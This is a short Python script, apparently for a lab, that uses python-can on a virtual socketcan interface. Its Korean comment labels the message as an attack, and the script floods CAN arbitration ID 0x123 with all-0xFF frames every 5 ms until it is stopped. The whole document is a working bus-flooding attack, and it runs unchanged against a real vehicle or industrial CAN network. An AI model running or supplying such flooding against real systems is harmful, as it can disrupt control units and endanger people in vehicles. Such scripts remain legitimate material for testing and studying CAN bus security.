import can
import time

bus = can.interface.Bus(channel='vcan0', bustype='socketcan')

# 공격할 메시지 설정
target_id = 0x123
payload = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF]

msg = can.Message(arbitration_id=target_id, data=payload, is_extended_id=False)

print(f"[*] Flooding ID {hex(target_id)} ... Press Ctrl+C to stop.")

try:
    while True:
        bus.send(msg)
        time.sleep(0.005) # 5ms 간격 (매우 빠름)
except KeyboardInterrupt:
    print("Stopped.")
